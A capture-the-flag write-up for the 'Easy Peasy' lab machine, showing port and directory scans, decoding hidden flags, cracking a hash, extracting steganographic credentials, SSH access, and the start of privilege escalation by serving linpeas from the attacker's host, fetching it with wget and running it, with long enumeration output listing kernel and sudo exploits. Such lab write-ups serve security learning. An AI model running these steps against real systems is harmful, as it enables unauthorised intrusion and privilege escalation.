# Easy Peasy

Laurent Chauvin | November 06, 2022

## Resources

[1] https://md5hashing.net/

[2] https://www.dcode.fr/identification-chiffrement

[3] https://gchq.github.io/CyberChef

[4] https://www.dcode.fr/chiffre-rot

## Progress

```
export IP=10.10.160.119
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 22:25 EST
Nmap scan report for 10.10.160.119
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.71 seconds
```

Gobuster Nginx scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster_nginx.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.119
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/06 22:53:01 Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.160.119/hidden/]
```

Gobuster Apache scan
```

```

Nikto scan
```
```

Running nmap on all ports
```
nmap -v -p- -oN nmap/all_ports $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 22:34 EST
Initiating Ping Scan at 22:34
Scanning 10.10.160.119 [2 ports]
Completed Ping Scan at 22:34, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:34
Completed Parallel DNS resolution of 1 host. at 22:34, 0.04s elapsed
Initiating Connect Scan at 22:34
Scanning 10.10.160.119 [65535 ports]
Discovered open port 80/tcp on 10.10.160.119
Increasing send delay for 10.10.160.119 from 0 to 5 due to 64 out of 212 dropped probes since last increase.
Discovered open port 65524/tcp on 10.10.160.119
Connect Scan Timing: About 4.38% done; ETC: 22:46 (0:11:17 remaining)
Connect Scan Timing: About 9.37% done; ETC: 22:45 (0:09:50 remaining)
Increasing send delay for 10.10.160.119 from 5 to 10 due to max_successful_tryno increase to 4
Connect Scan Timing: About 12.50% done; ETC: 22:46 (0:10:37 remaining)
Connect Scan Timing: About 30.95% done; ETC: 22:49 (0:09:58 remaining)
Increasing send delay for 10.10.160.119 from 10 to 20 due to max_successful_tryno increase to 5
Connect Scan Timing: About 47.82% done; ETC: 22:52 (0:09:14 remaining)
Connect Scan Timing: About 55.44% done; ETC: 22:53 (0:08:20 remaining)
Discovered open port 6498/tcp on 10.10.160.119
Connect Scan Timing: About 62.01% done; ETC: 22:54 (0:07:24 remaining)
```

Finding service on the highest port
```
nmap -p 65524 -sV -oN nmap/highest_port $IP 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 22:48 EST
Nmap scan report for 10.10.160.119
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
```

Nginx running on port 80 (default page) and Apache on port 65524 (default page).


On Apache, looking for 'robots.txt'
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

Adding the ```-a a18672860d0510e5ab6699730763b250``` option to gobuster and restart the scan. Nothing.

Sending this 'user agent' (who looks like a hash) to ```nth``` gives us
```
nth -f user_agent_hash.txt 

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

a18672860d0510e5ab6699730763b250

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

Least Likely
Domain Cached Credentials 2, HC: 2100 JtR: mscach2 Double MD5, HC: 2600  LM, HC: 3000 JtR: lm RIPEMD-128, JtR: ripemd-128 Haval-128, JtR: haval-128-4 Haval-128 (3 rounds), JtR: dynamic_160 Haval-128 (5 rounds), JtR: dynamic_180 
Tiger-128,  Skein-256(128),  Skein-512(128),  Lotus Notes/Domino 5, HC: 8600 JtR: lotus5 Skype, HC: 23  ZipMonster,  PrestaShop, HC: 11000  md5(md5(md5($pass))), HC: 3500  md5(uppercase(md5($pass))), HC: 4300  md5(sha1($pass)), HC: 4400
md5($pass.$salt), HC: 10  md5($salt.$pass), HC: 20  md5(unicode($pass).$salt), HC: 30  md5($salt.unicode($pass)), HC: 40  HMAC-MD5 (key = $pass), HC: 50 JtR: hmac-md5 HMAC-MD5 (key = $salt), HC: 60 JtR: hmac-md5 md5(md5($salt).$pass), 
HC: 3610  md5($salt.md5($pass)), HC: 3710  md5($pass.md5($salt)), HC: 3720  md5($salt.$pass.$salt), HC: 3810  md5(md5($pass).md5($salt)), HC: 3910  md5($salt.md5($salt.$pass)), HC: 4010  md5($salt.md5($pass.$salt)), HC: 4110  
md5($username.0.$pass), HC: 4210  md5(utf16($pass)), JtR: dynamic_29 md4($salt.$pass), JtR: dynamic_31 md4($pass.$salt), JtR: dynamic_32 md4(utf16($pass)), JtR: dynamic_33 md5(md4($pass)), JtR: dynamic_34 net-md5, JtR: dynamic_39 
md5($salt.pad16($pass)), JtR: dynamic_39 MD2, JtR: md2 Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900 JtR: radmin Cisco Type 7,  BigCrypt, JtR: bigcrypt PKZIP Master Key, HC: 20500  
```

Probably a md5. Tried Crackstation but didn't work, however I got more luck with [1]
```
flag{1m_s3c0nd_fl4g}
```

In the meantime, looking at the Apache 'default' page we can read and find flag 3
```
They are activated by symlinking available configuration files from their respective Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} *-available/ counterparts. These should be managed by using our helpers a2enmod, a2dismod, a2ensite, a2dissite, and a2enconf, a2disconf . See their respective man pages for detailed information. 
```

This flag can also be find in 'easypeasy.txt'
```
cat easypeasy.txt| grep flag

flag{9fdafbd64c47471a8f54cd3fc64cd312}
...
```

We have found a hidden directory on nginx, which only load an image (nothing particular on this image). Let's enumerate the directory with gobuster
```
gobuster dir -u $IP/hidden -w /usr/share/wordlists/dirb/common.txt | tee gobuster_nginx.log 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.119/hidden
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/06 23:19:03 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.10.160.119/hidden/whatever/]
Progress: 4604 / 4615 (99.76%)===============================================================
2022/11/06 23:19:57 Finished
===============================================================
```

A 'whatever' page is found. An image is shown, but inspecting the source code, we find
```
<p hidden="">ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

When base64 decoded give us the first flag
```
echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d  

flag{f1rs7_fl4g} 
```

Let's keep diging directories.
```
gobuster dir -u $IP/hidden/whatever -w /usr/share/wordlists/dirb/common.txt | tee gobuster_nginx_whatever.log    

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.119/hidden/whatever
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/06 23:22:31 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 435]
Progress: 4593 / 4615 (99.52%)===============================================================
2022/11/06 23:23:22 Finished
===============================================================
```

Let's check for files. Nothing there.

When looking at the Apache default page source code, we can also see
```
<p hidden="">its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
```

Putting this into [2] it suggests it might be a base62 encoded string. Let's decode
```
/n0th1ng3ls3m4tt3r
```

Looing at the source code of the page, we can see an image with binary, and in the source code
```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

When inspectiing the image with 'rockyou.txt' we got nothing
```
stegseek binarycodepixabay.jpg /opt/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.84% (133.2 MB)           
[!] error: Could not find a valid passphrase.
```

As the challenge reads 'Using the wordlist that provided to you in this task crack the hash'

Let inspect it with 'easypeasy.txt'
```
stegseek binarycodepixabay.jpg easypeasy.txt                                         
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "mypasswordforthatjob"
[i] Original filename: "secrettext.txt".
[i] Extracting to "binarycodepixabay.jpg.out".
```

Showing the hidden text, we have
```
cat secrettext.txt    

username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

Where password gives, after conversion with [3]
```
iconvertedmypasswordtobinary
```

Let's try to ssh. On this machine, ssh is on port 6498
```
ssh -p 6498 boring@$IP

The authenticity of host '[10.10.18.203]:6498 ([10.10.18.203]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '[10.10.18.203]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.18.203's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
```

Let's get flag
```
boring@kral4-PC:~$ cat user.txt

User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

Let's use [4] to find the right rotation.
```
flag{n0wits33msn0rm4l}
```

Time to privesc.
```
boring@kral4-PC:~$ sudo -l

Sorry, user boring may not run sudo on kral4-PC.
```

Let's upload linpeas. Start a webserver locally in linpeas directory using
```
python3 -m http.server 80
```

Then from remote
```
wget 10.18.23.136/linpeas.sh
```

Run it
```
chmod +x linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                     
    |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by carlospolop                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 4.15.0-106-generic (buildd@lcy01-amd64-016) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020
User & Groups: uid=1000(boring) gid=1000(boring) groups=1000(boring)
Hostname: kral4-PC
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                         
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                                                                                                            
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                          
                              ╚════════════════════╝                                                                                                                                                                                        
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                          
Linux version 4.15.0-106-generic (buildd@lcy01-amd64-016) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020                                                                                     
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                             
Sudo version 1.8.21p2                                                                                                                                                                                                                       

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034                                                                                                                                                                                                                 

Potentially Vulnerable to CVE-2022-2588


╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                                                                                                     
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games                                                                                                                                                    
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

╔══════════╣ Date & uptime
Sun Nov  6 21:18:13 PST 2022                                                                                                                                                                                                                
 21:18:13 up 52 min,  1 user,  load average: 0.28, 0.07, 0.02

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                                                                        

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                                                                                   
UUID=e641696d-e034-4410-88af-8f0278e5a378       /       ext4    errors=remount-ro       0 1                                                                                                                                                 

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                                                                     
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                                                                                                             
HISTFILESIZE=0
MAIL=/var/mail/boring
USER=boring
SSH_CLIENT=10.18.23.136 37840 6498
SHLVL=1
HOME=/home/boring
OLDPWD=/var/www/html
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
LOGNAME=boring
_=./linpeas.sh
XDG_SESSION_ID=43
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/dev/shm
SSH_CONNECTION=10.18.23.136 37840 10.10.18.203 6498
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                                                                                                                      
dmesg Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2021-4034] PwnKit                                                                                                                                                                                                                  

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                     
                                                                                                                                                                                                                                            
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                                                                               
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                                                                           
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                                                                    
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                                                                      
═╣ Seccomp enabled? ............... disabled                                                                                                                                                                                                
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                                                                                               

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                         
                                   ╚═══════════╝                                                                                                                                                                                            
╔══════════╣ Container related tools present
╔══════════╣ Am I Containered?                                                                                                                                                                                                              
╔══════════╣ Container details                                                                                                                                                                                                              
═╣ Is this a container? ........... No                                                                                                                                                                                                      
═╣ Any running containers? ........ No                                                                                                                                                                                                      
                                                                                                                                                                                                                                            

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                                                                         
                                     ╚═══════╝                                                                                                                                                                                              
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0a66a863d2dbc9b41                                                                                                                                                                                                               
instance-action: none
instance-id: i-065a0969f2d5987a1
instance-life-cycle: on-demand
instance-type: t2.nano
region: eu-west-1

══╣ Account Info
{                                                                                                                                                                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2022-11-07T05:15:00Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:a4:be:d5:b1:71/                                                                                                                                                                                                                     
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                                                                                                            

══╣ User Data
                                                                                                                                                                                                                                            

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                                                                 
root         1  0.3  1.7 159640  8760 ?        Ss   20:26   0:11 /sbin/init splash                                                                                                                                                          
root       240  0.0  2.5 127776 12728 ?        S<s  20:26   0:02 /lib/systemd/systemd-journald
root       258  0.0  0.8  44052  4320 ?        Ss   20:26   0:02 /lib/systemd/systemd-udevd
systemd+   278  0.0  1.0  80060  5296 ?        Ss   20:26   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   409  0.0  1.0  70640  5332 ?        Ss   20:27   0:00 /lib/systemd/systemd-resolved
systemd+   410  0.0  0.6 143996  3280 ?        Ssl  20:27   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       452  0.0  0.1   4552   708 ?        Ss   20:27   0:00 /usr/sbin/acpid
